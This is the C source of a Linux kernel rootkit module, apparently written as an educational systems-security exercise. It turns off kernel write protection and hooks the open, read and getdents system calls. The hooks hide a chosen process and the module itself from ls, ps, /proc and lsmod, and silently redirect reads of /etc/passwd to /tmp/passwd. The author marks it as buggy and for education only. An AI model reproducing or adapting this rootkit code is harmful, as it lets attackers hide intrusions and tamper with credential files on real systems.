/**
 * Author: Prathikshaa Rangarajan
 * Date: April 10, 2019
 * File Name: sneaky_mod.c
 * Description:
 * Kernel module.
 * Modifies open(2), getdents(2), read(2)
 * Contains bugs. For educational purposes only.
 */
#include <asm/cacheflush.h>
#include <asm/current.h> // process information
#include <asm/page.h>
#include <asm/unistd.h>    // for system call constants
#include <linux/highmem.h> // for changing page permissions
#include <linux/init.h>    // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h> // for printk and other kernel bits
#include <linux/module.h> // for all modules
#include <linux/ratelimit.h>
#include <linux/sched.h>

#define BUFFER_LEN 256

#define KERN_AUTHOR "Prathikshaa Rangarajan"
#define KERN_DESC                                                              \
  "Sneaky Module takes sneaky_pid as input.\nHides sneaky_process and "        \
  "sneaky_module from: ls, cd, find, ls /proc, ps, lsmod.\ncat /etc/passwd "   \
  "shows /tmp/passwd"

// Module Param -- Take pid of sneaky process as input
static int sneaky_pid = 0;
module_param(sneaky_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
MODULE_PARM_DESC(sneaky_pid, "PID of sneaky process.");

// printk(KERN_INFO "PID of sneaky process: %d\n", sneaky_pid);

// Macros for kernel functions to alter Control Register 0 (CR0)
// This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
// Bit 0 is the WP-bit (write protection). We want to flip this to 0
// so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

// These are function pointers to the system calls that change page
// permissions for the given address (page) to read-only or read-write.
// Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) =
    (void *)0xffffffff81072040; // 0xffffffff810707b0;
void (*pages_ro)(struct page *page, int numpages) =
    (void *)0xffffffff81071fc0; // 0xffffffff81070730;

// This is a pointer to the system call table in memory
// Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
// We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table =
    (unsigned long *)0xffffffff81a00200; // 0xffffffff81a00200;

// Function pointer will be used to save address of original 'open' syscall.
// The asmlinkage keyword is a GCC #define that indicates this function
// should expect to find its arguments on the stack (not in registers).
// This is used for all system calls.

// open
asmlinkage int (*original_open_call)(const char *pathname, int flags);
// read
asmlinkage ssize_t (*original_read_call)(int fd, void *buf, size_t count);
// getdents struct
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFER_LEN];
};
// getdents
asmlinkage int (*original_getdents_call)(unsigned int fd,
                                         struct linux_dirent *dirp,
                                         unsigned int count);
/*-----------------------------------------------------------------*/
// getdents
char sneaky_pid_str[BUFFER_LEN];
const char *sneaky_process = "sneaky_process";
int nread = -1;
struct linux_dirent *d;
unsigned short bpos;

// open
const char *passwd_path = "/etc/passwd";
const char *tmp_path = "/tmp/passwd";
const char *lsmod = "/proc/modules";

// read
static int lsmod_open = 0;
const char *sneaky_mod = "sneaky_mod";
ssize_t nread_read;
/*-----------------------------------------------------------------*/

// Define our new sneaky version of the 'read' syscall
asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
  printk_ratelimited(KERN_INFO "Sneaky: Read syscall\n");
  nread_read = original_read_call(fd, buf, count);
  if (nread_read <= 0) {
    return nread_read;
  }

  if (lsmod_open) {
    // find sneaky_mod
    void *sneaky_start = strstr(buf, sneaky_mod);
    if (sneaky_start == NULL) {
      lsmod_open = 0;
      return nread_read; // sneaky_mod not found
    }

    void *src = strchr((char *)sneaky_start, '\n');
    //    printk_ratelimited(KERN_INFO "Read: after sneaky_mod: %s\n", (char
    //    *)src);
    src += 1;
    //    printk_ratelimited(KERN_INFO "Read: after new_line: %s\n", (char
    //    *)src);

    /* size_t copy_size = buf + nread_read - src; */
    /* printk_ratelimited(KERN_INFO "Read: copy_size: %lu, strlen(src): %lu\n",
     */
    /*                    copy_size, strlen((char *)src)); */

    memmove(sneaky_start, src, strlen((char *)src));
    nread_read -= (src - sneaky_start);

    lsmod_open = 0;
  }

  return nread_read;
}

// Define our new sneaky version of the 'getdents' syscall
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                   unsigned int count) {
  printk_ratelimited(KERN_INFO "Sneaky: getdents syscall\n");
  nread = original_getdents_call(fd, dirp, count);
  if (nread <= 0) {
    return nread;
  }
  memset(sneaky_pid_str, 0, BUFFER_LEN);
  snprintf(sneaky_pid_str, BUFFER_LEN, "%d", sneaky_pid);
  printk_ratelimited(KERN_INFO "getdents: sneaky_pid_str = %s\n",
                     sneaky_pid_str);

  for (bpos = 0; bpos < nread;) {
    d = (struct linux_dirent *)((char *)dirp + bpos);
    // find sneaky_process related stuff and remove
    if ((!(strcmp(d->d_name, sneaky_pid_str))) ||
        (strstr(d->d_name, sneaky_process))) {
      printk_ratelimited(KERN_INFO "getdents: name match: %s", d->d_name);
      // memmove to delete entry
      void *src = (void *)d + d->d_reclen;
      void *dest = (void *)d;
      size_t count = (size_t)nread - (bpos + d->d_reclen);
      memmove(dest, src, count);
      nread -= d->d_reclen;
    }

    bpos += d->d_reclen;
  }

  return nread;
}

// Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
  printk_ratelimited(KERN_INFO "Sneaky: Open syscall\n");

  if (!(strcmp(pathname, passwd_path))) {
    printk_ratelimited(KERN_INFO "Sneaky Open: matched /etc/passwd... %s\n",
                       pathname);
    copy_to_user((char *)pathname, tmp_path, strlen(tmp_path));
    printk_ratelimited(KERN_INFO "Sneaky Open: User Space path - %s\n",
                       pathname);
  }

  if (!(strcmp(pathname, lsmod))) {
    lsmod_open = 1;
  }

  return original_open_call((const char *)pathname, flags);
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  struct page *page_ptr;

  // See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  printk(KERN_INFO "Sneaky process pid %d", sneaky_pid);

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is the magic! Save away the original 'open' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_open_call = (void *)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_read_call = (void *)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  original_getdents_call = (void *)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void) {
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_open_call;
  *(sys_call_table + __NR_read) = (unsigned long)original_read_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents_call;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR(KERN_AUTHOR);
MODULE_DESCRIPTION(KERN_DESC);

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
